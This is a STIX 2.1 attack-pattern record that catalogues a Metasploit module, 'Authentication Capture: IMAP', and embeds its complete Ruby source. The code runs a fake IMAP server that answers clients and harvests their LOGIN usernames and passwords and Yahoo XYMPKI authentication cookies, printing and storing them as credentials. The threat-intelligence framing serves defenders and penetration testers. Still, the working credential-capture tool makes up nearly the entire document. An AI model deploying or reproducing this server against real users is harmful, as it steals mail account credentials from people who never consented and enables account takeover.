{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca83fd7e-b573-436b-b0c8-fbdc1b7d5590",
    "created": "2024-08-14T16:22:00.820908Z",
    "modified": "2024-08-14T16:22:00.820912Z",
    "name": "Authentication Capture: IMAP",
    "description": " This module provides a fake IMAP service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/imap.rb",
            "external_id": "imap.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Authentication Capture: IMAP',\n      'Description'    => %q{\n        This module provides a fake IMAP service that\n      is designed to capture authentication credentials.\n      },\n      'Author'      => ['ddz', 'hdm'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Capture', 'Description' => 'Run IMAP capture server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Capture'\n        ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',  [ true, \"The local port to listen on.\", 143 ]),\n        OptString.new('BANNER', [ true, \"The server banner\",  'IMAP4'])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {:name => \"#{c.peerhost}:#{c.peerport}\", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}\n    c.put \"* OK #{datastore['BANNER']}\\r\\n\"\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return unless data\n    num, cmd, arg = data.strip.split(/\\s+/, 3)\n    cmd ||= ''\n    arg ||= ''\n    args = []\n\n    # If the argument is a number in braces, such as {3}, it means data is coming\n    # separately\n    if arg.chomp =~ /\\{[0-9]+\\}$/\n      loop do\n        # Ask for more data\n        c.put \"+ \\r\\n\"\n\n        # Get the next line\n        arg = (c.get_once || '').chomp\n\n        # Remove the length field, if there is one\n        if arg =~ /(.*) \\{[0-9]+\\}$/\n          args << $1\n        else\n          # If there's no length field, we're at the end\n          args << arg\n          break\n        end\n      end\n    else\n      # If there's no length, treat it like we used to\n      args = arg.split(/\\s+/)\n    end\n\n    if cmd.upcase == 'CAPABILITY'\n      c.put \"* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS \" +\n        \"MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT \" +\n        \"QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 \" +\n        \"AUTH=XYMPKI AUTH=XYMECOOKIE ID\\r\\n\"\n      c.put \"#{num} OK CAPABILITY completed.\\r\\n\"\n    end\n\n    # Handle attempt to authenticate using Yahoo's magic cookie\n    # Used by iPhones and Zimbra\n    if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'\n      c.put \"+ \\r\\n\"\n      cookie1 = c.get_once\n      c.put \"+ \\r\\n\"\n      cookie2 = c.get_once\n      register_creds(@state[c][:ip], cookie1, cookie2, 'imap-yahoo')\n      return\n    end\n\n    if cmd.upcase == 'LOGIN'\n      @state[c][:user], @state[c][:pass] = args\n      register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')\n      print_good(\"IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}\")\n\n      return\n    end\n\n    if cmd.upcase == 'LOGOUT'\n      c.put(\"* BYE IMAP4rev1 Server logging out\\r\\n\")\n      c.put(\"#{num} OK LOGOUT completed\\r\\n\")\n      return\n    end\n\n    if cmd.upcase == 'ID'\n      # RFC2971 specifies the ID command, and `NIL` is a valid response\n      c.put(\"* ID NIL\\r\\n\")\n      c.put(\"#{num} OK ID completed\\r\\n\")\n      return\n    end\n\n    @state[c][:pass] = data.strip\n    c.put \"#{num} NO LOGIN FAILURE\\r\\n\"\n    return\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\n\n  def register_creds(client_ip, user, pass, service_name)\n    # Build service information\n    service_data = {\n      address: client_ip,\n      port: datastore['SRVPORT'],\n      service_name: service_name,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    # Build credential information\n    credential_data = {\n      origin_type: :service,\n      module_fullname: self.fullname,\n      private_data: pass,\n      private_type: :password,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n"
}